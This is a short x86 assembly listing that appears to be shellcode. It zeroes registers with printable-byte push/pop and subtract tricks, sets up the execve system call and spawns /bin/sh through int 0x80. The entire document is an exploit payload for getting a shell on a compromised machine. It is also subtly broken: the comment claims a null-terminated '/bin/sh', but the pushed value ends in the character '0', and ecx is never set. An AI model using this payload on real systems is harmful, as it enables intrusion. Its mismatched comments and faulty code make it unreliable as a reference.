[global _start]
  
_start:
  ; eax = 0
  push 0x41
  pop eax
  sub al, 0x41

  ; edx = 0
  push eax
  pop edx

  ; eax = 0xb
  push 0x41
  pop eax
  sub al, 0x36

  ; Push /bin/sh\x00
  push 0x3068732f
  push 0x6e69622f
  push esp
  pop ebx
  int 0x80
